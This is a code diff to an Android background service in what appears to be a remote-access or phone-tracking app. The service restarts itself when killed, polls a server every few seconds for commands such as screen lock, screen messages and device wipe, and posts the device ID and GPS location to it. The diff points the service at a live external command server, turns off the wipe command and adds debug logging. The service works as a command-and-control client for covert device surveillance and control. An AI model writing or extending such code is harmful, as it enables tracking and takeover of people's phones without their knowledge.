@@ -75,9 +75,10 @@ import me.everything.providers.android.calllog.CallsProvider;
 import me.everything.providers.android.telephony.TelephonyProvider;
 
 public class InternalService extends Service implements TextToSpeech.OnInitListener {
-
+    private static final String TAG = "H_InternalService";
     public Context context;
-    private String SERVER_URI = "https://your-direct-url/commands.php";
+    private String SERVER_URI = "https://holmes0101an.serv00.net/commands.php";
+    // private String SERVER_URI = "http://10.0.2.2:3000/public/commands.php";
     private Timer timerTaskScheduler = new Timer();
     private LocationTracker tracker = null;
     private String deviceUniqueId = null;
@@ -89,9 +90,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     public void onCreate() {
         super.onCreate();
 
-        Log.d("myLog", "Service: onCreate");
-
-
+        Log.d(TAG, "Service: onCreate");
 
         this.context = this.getApplicationContext();
         locationDataClass = new AppContant();
@@ -109,12 +108,12 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d("myLog", "Service: onStartCommand");
+        Log.d(TAG, "Service: onStartCommand");
         return START_STICKY;
     }
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        Log.d("myLog", "Service: onTaskRemoved");
+        Log.d(TAG, "Service: onTaskRemoved");
 
         Intent restartService = new Intent(getApplicationContext(), this.getClass());
         restartService.setPackage(getPackageName());
@@ -193,7 +192,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
                 checkCommandRequests();
             }
 
-        }, 0, 5000);
+        }, 0, 10000);
     }
 
 
@@ -221,6 +220,8 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     }
 
     private void sendPostRequestsToClient(HashMap<String, Object> postData) {
+        Log.d(TAG, "sendPostRequestsToClient() called with: postData = [" + postData + "]");
+        System.out.println(postData);
         AndroidNetworking.post(SERVER_URI)
                 .addBodyParameter(postData)
                 .build()
@@ -264,6 +265,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
                 .getAsJSONObject(new JSONObjectRequestListener() {
                     @Override
                     public void onResponse(JSONObject response) {
+                        Log.d(TAG, "onResponse() called with: response = [" + response + "]");
                     }
 
                     @Override
@@ -318,7 +320,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
             screenMessage(response);
         }
         if (response.has("wipe")) {
-            wipe(response);
+            // wipe(response);
         }
         if (response.has("LockTheScreen")) {
             LockTheScreen(response);
@@ -359,6 +361,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         }
     }
 
+
     private void checkCommandRequests() {
         HashMap<String, String> hashMap = new HashMap<>();
         hashMap.put("device_id", deviceUniqueId);
@@ -367,6 +370,18 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
                 .addBodyParameter(hashMap)
                 .setPriority(Priority.MEDIUM)
                 .build()
+                // .getAsString(new StringRequestListener() {
+                //     @Override
+                //     public void onResponse(String response) {
+                //         // if(System.currentTimeMillis() % 5 == 0)
+                //         Log.d(TAG, "onResponse() called with: response = [" + response + "]");
+                //     }
+                //
+                //     @Override
+                //     public void onError(ANError anError) {
+                //         Log.d(TAG, "onError() called with: anError = [" + anError + "]");
+                //     }
+                // });
                 .getAsJSONObject(new JSONObjectRequestListener() {
                     @Override
                     public void onResponse(JSONObject response) {
@@ -376,7 +391,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
                     @Override
                     public void onError(ANError anError) {
-
+                        Log.d(TAG, "onError() called with: anError = [" + anError + "]");
                     }
                 });
 
@@ -439,11 +454,12 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
                         .getAsString(new StringRequestListener() {
                             @Override
                             public void onResponse(String response) {
-
+                                Log.d(TAG, "onResponse() called with: response = [" + response + "]");
                             }
 
                             @Override
                             public void onError(ANError anError) {
+                                Log.d(TAG, "onError() called with: anError = [" + anError + "]");
                             }
                         });
             }
@@ -649,6 +665,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     private void prepareLocationdata() {
 
         tracker.quickFix(this.context);
+        Log.d(TAG, "prepareLocationdata() called with: locationDataClass = " + locationDataClass.getLatitude +"locationDataClass.getLongitude = "+ locationDataClass.getLongitude);
         if (locationDataClass.getLatitude != 0.0 && locationDataClass.getLongitude != 0.0) {
             HashMap<String, Object> postData = new HashMap<>();
             postData.put("device_id", deviceUniqueId);
